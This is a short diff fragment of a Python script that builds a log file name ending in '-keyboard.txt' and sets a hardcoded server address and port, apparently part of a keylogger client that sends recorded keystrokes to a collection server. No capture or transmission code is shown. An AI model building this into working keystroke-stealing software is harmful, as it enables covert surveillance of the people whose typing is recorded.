@@ -4,7 +4,7 @@ from time import strftime
 
 ip_host = socket.gethostbyname(socket.gethostname())
 time = strftime("%Y-%m-%d_%H-%M-%S")
-file_name = ip_host + "_" + time + ".txt"
+file_name = ip_host + "-" + time + "-keyboard.txt"
 ip_server = "192.168.1.66"
 port = 8080
 client_ssl = Queue()
